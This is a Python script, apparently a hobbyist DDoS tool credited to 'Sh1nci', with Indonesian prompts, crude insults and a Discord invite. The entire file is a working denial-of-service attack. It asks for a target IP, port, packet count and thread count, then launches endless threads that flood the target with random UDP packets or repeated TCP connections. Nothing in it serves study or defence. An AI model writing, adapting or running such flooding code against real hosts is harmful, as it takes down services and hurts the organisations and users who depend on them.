#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by Sh1nci
#Join My T3Am : https://discord.gg/3Qe7Sb7b
import random
import socket
import threading
import os

os.system("clear")
print("Tools Ddos By Sh1nci V3")
print("Jangan Abuse Ya Sayang Muachh")
print("Kalo Gak Tembus Berarti Lu Jelek ")
ip = str(input(" DdosAttackSh1nci | Ip:"))
port = int(input(" DdosAttackSh1nci | Port:"))
choice = str(input(" DdosAttackBySh1nci | Gas Attack Gak Nih?(y/n):"))
times = int(input(" DdosAttackBySh1nci | Packets:"))
threads = int(input(" DdosAttackBySh1nci | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Sh1nci |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sh1nci nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()